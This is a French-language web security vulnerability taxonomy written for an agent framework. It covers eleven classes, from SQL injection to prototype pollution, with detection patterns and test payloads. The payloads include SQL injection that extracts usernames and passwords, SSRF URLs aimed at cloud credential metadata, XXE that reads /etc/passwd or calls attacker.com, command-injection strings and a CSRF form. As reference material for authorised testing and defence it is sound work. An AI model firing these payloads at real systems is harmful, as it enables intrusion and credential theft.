# Security Vulnerability Taxonomy

> **Source**: Adapte de Strix (usestrix/strix) pour ULTRA-CREATE v27.18
> **Version**: 1.0.0
> **Categories**: 11 vulnerabilites principales

---

## Vue d'Ensemble

Cette taxonomie categorise les vulnerabilites de securite web les plus critiques, avec des patterns de detection et d'exploitation pour tests autorises uniquement.

---

## 1. IDOR (Insecure Direct Object Reference)

### Description
Acces non autorise a des ressources via manipulation d'identifiants.

### Patterns de Detection
```
- URLs avec IDs sequentiels: /api/users/123, /orders/456
- Parametre id, user_id, order_id dans les requetes
- Absence de verification d'ownership cote serveur
```

### Vecteurs de Test
```
1. Enumeration d'IDs (123 -> 124, 125...)
2. UUID prediction si non-random
3. Changement de contexte utilisateur
4. Manipulation de references dans JWT/cookies
```

### Severite: HAUTE
### CWE: CWE-639

---

## 2. SQL Injection (SQLi)

### Description
Injection de code SQL via des entrees non sanitisees.

### Patterns de Detection
```
- Parametres dans WHERE clauses
- Recherche/filtrage dynamique
- Erreurs SQL exposees
- Comportement different avec ' ou "
```

### Vecteurs de Test
```
1. Classic: ' OR '1'='1
2. Union-based: ' UNION SELECT...
3. Blind boolean: ' AND 1=1--
4. Time-based: ' AND SLEEP(5)--
5. Error-based: ' AND extractvalue(...)
```

### Payloads Communs
```sql
-- Detection basique
' OR '1'='1
" OR "1"="1
' OR 1=1--
' OR 1=1#

-- Enumeration colonnes
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Extraction data (apres detection colonnes)
' UNION SELECT username,password FROM users--
```

### Severite: CRITIQUE
### CWE: CWE-89

---

## 3. Cross-Site Scripting (XSS)

### Description
Injection de scripts malveillants executes cote client.

### Types
| Type | Persistance | Vecteur |
|------|-------------|---------|
| Reflected | Non | URL/Parametre |
| Stored | Oui | Base de donnees |
| DOM-based | Variable | JavaScript client |

### Patterns de Detection
```
- Reflexion de l'input dans la reponse HTML
- Insertion dans attributs, balises, scripts
- Contenu user-generated affiche
- innerHTML, document.write usage
```

### Payloads Communs
```html
<!-- Detection basique -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Bypass filtres -->
<ScRiPt>alert('XSS')</ScRiPt>
<img src="x" onerror="alert('XSS')">
<body onload=alert('XSS')>
javascript:alert('XSS')

<!-- DOM XSS -->
#<img src=x onerror=alert('XSS')>
?search=<script>alert('XSS')</script>
```

### Severite: HAUTE
### CWE: CWE-79

---

## 4. Server-Side Request Forgery (SSRF)

### Description
Manipulation du serveur pour effectuer des requetes vers des ressources internes.

### Patterns de Detection
```
- Parametres URL: url=, path=, src=, dest=
- Fonctionnalites fetch/preview/webhook
- Import depuis URL externe
- PDF generation avec URLs
```

### Vecteurs de Test
```
1. Localhost: http://127.0.0.1, http://localhost
2. Cloud metadata: http://169.254.169.254
3. Internal IPs: http://10.x.x.x, http://192.168.x.x
4. DNS rebinding
5. Protocol smuggling: file://, gopher://
```

### Payloads Communs
```
# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/

# Azure Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Localhost bypass
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://127.1
http://2130706433 (decimal IP)
```

### Severite: CRITIQUE
### CWE: CWE-918

---

## 5. XML External Entity (XXE)

### Description
Injection d'entites XML externes pour lire fichiers ou SSRF.

### Patterns de Detection
```
- Upload/parsing XML
- SOAP endpoints
- SVG upload
- Office documents (DOCX, XLSX)
```

### Payloads Communs
```xml
<!-- File disclosure -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/">
]>
<foo>&xxe;</foo>

<!-- Blind XXE (out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

### Severite: HAUTE
### CWE: CWE-611

---

## 6. Remote Code Execution (RCE)

### Description
Execution de code arbitraire sur le serveur.

### Patterns de Detection
```
- Fonctions eval(), exec(), system()
- Deserialization non securisee
- Template injection
- File upload sans validation
- Command injection via inputs
```

### Vecteurs de Test
```
1. Command injection: ; ls, | cat /etc/passwd, `whoami`
2. Template injection: {{7*7}}, ${7*7}
3. Deserialization (Java, PHP, Python pickle)
4. File upload + path traversal
```

### Severite: CRITIQUE
### CWE: CWE-94

---

## 7. Authentication Bypass

### Description
Contournement des mecanismes d'authentification.

### Patterns de Detection
```
- Logic flaws dans le flow auth
- JWT manipulation
- Session fixation
- Password reset flaws
- OAuth misconfiguration
```

### Vecteurs de Test
```
1. JWT: Modifier alg none, modifier claims
2. Session: Voler/predire session ID
3. Password reset: Token reuse, email injection
4. OAuth: Redirect URI manipulation
5. MFA bypass: Race conditions, backup codes
```

### Severite: CRITIQUE
### CWE: CWE-287

---

## 8. Race Condition

### Description
Exploitation de timing entre operations concurrentes.

### Patterns de Detection
```
- Operations financieres (transferts, achats)
- Coupon/promo code usage
- Rate limiting
- File operations
- Database updates sans locks
```

### Vecteurs de Test
```
1. Envoyer N requetes simultanees
2. Exploiter TOCTOU (Time of Check to Time of Use)
3. Manipuler sequence d'operations
4. Parallel requests sur meme ressource
```

### Severite: MOYENNE-HAUTE
### CWE: CWE-362

---

## 9. Business Logic Flaws

### Description
Abus de la logique metier de l'application.

### Patterns de Detection
```
- Workflows multi-etapes
- Pricing/discount logic
- Role-based access
- State machines
- Limites/quotas
```

### Vecteurs de Test
```
1. Sauter des etapes dans un workflow
2. Manipuler prix/quantites (negatifs, decimaux)
3. Abuser des promos/coupons
4. Escalade de privileges
5. Bypass limites via race conditions
```

### Severite: VARIABLE (selon impact)
### CWE: CWE-840

---

## 10. Cross-Site Request Forgery (CSRF)

### Description
Forcer un utilisateur authentifie a executer des actions non voulues.

### Patterns de Detection
```
- Absence de token CSRF
- Token predictible
- Cookie SameSite=None
- Actions sensibles via GET
```

### Vecteurs de Test
```html
<!-- Form-based CSRF -->
<form action="https://target.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
  <input type="submit">
</form>
<script>document.forms[0].submit()</script>

<!-- Image-based (GET) -->
<img src="https://target.com/delete?id=123">
```

### Severite: MOYENNE
### CWE: CWE-352

---

## 11. Prototype Pollution

### Description
Modification du prototype Object en JavaScript.

### Patterns de Detection
```
- Merge/extend functions
- Deep clone operations
- JSON.parse avec Object.assign
- Query string parsing
```

### Vecteurs de Test
```javascript
// Via query string
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true

// Via JSON body
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

### Severite: HAUTE
### CWE: CWE-1321

---

## Matrice de Priorite

| Vulnerabilite | Impact | Exploitabilite | Priorite |
|---------------|--------|----------------|----------|
| RCE | CRITIQUE | Moyenne | P0 |
| SQLi | CRITIQUE | Haute | P0 |
| Auth Bypass | CRITIQUE | Moyenne | P0 |
| SSRF | HAUTE | Moyenne | P1 |
| XXE | HAUTE | Moyenne | P1 |
| XSS Stored | HAUTE | Haute | P1 |
| IDOR | HAUTE | Haute | P1 |
| Prototype Pollution | HAUTE | Moyenne | P1 |
| Race Condition | MOYENNE | Basse | P2 |
| CSRF | MOYENNE | Haute | P2 |
| Business Logic | VARIABLE | Variable | P2 |

---

## Integration ULTRA-CREATE

### Agents Concernes
- `strix-coordinator`: Orchestration tests securite
- `payload-engineer`: Generation payloads adaptatifs
- `exploit-validator`: Validation sans execution
- `security-scanner-expert`: Scanner generaliste
- `penetration-tester`: Tests manuels guides

### Synergy
```json
"security-testing": {
  "primary": ["strix-coordinator", "security-scanner-expert"],
  "secondary": ["payload-engineer", "exploit-validator"]
}
```

### Commande
```bash
/security-scan [target] [--type SQLi|XSS|IDOR|...]
```

---

## Disclaimer

> **IMPORTANT**: Cette taxonomie est destinee UNIQUEMENT aux tests de securite autorises,
> CTF, recherche defensive et education. L'utilisation sur des systemes sans autorisation
> explicite est illegale.

---

*ULTRA-CREATE v27.18 - Security Taxonomy - Adapte de Strix*
